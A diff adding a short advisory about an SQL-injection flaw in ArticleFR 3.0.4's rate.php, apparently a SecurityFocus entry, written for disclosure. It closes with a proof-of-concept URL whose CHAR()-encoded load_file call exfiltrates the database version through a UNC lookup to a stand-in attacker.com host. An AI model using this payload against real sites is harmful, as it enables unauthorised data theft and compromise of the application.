@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/69307/info
+
+ArticleFR is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.
+
+A successful exploit may allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+ArticleFR 3.0.4 is vulnerable; prior versions may also be affected. 
+
+http://www.example.com/rate.php?act=get&id=0%20union%20select%201,(select load_file(CONCAT(CHAR(92),CHAR(92),(select version()),CHAR(46),CHAR(97),CHAR(116),CHAR(116),CHAR(97),CHAR(99),CHAR(107),CHA R(101),CHAR(114),CHAR(46),CHAR(99),CHAR(111),CHAR(109),CHAR(92),CHAR(102),CHAR(1 11),CHAR(111),CHAR(98),CHAR(97),CHAR(114))))%20--%202 
